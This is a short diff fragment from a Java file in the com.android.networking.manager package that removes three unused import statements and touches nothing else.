@@ -10,12 +10,9 @@ package com.android.networking.manager;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
-import java.util.Map.Entry;
-import java.util.Set;
 
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfEvent;
-import com.android.networking.conf.ConfigurationException;
 import com.android.networking.event.BaseEvent;
 import com.android.networking.event.FactoryEvent;
 import com.android.networking.util.Check;
